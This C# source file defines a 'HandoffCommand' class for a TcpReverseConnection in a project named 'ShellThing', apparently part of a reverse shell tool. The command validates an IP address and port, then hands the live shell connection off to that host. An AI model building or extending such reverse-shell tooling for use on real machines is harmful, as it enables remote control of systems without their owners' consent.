using System;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    class HandoffCommand: ICommand
    {
        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            //Validate command line arguments before
            if (ValidateArguments(commandArguments))
            {
                connection.HandoffConenection(commandArguments[1], commandArguments[2]);
            }
            else
            {
                connection.SendData("Handoff error - incorrect number of arguments supplied\n");
            }
        }

        public bool ValidateArguments(string[] commandArguments)
        {
            if (commandArguments.Length == 3)
            {
                if (TcpReverseConnection.ValidateIpAddress(commandArguments[1]) && TcpReverseConnection.ValidatePortNumber(commandArguments[2]))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}
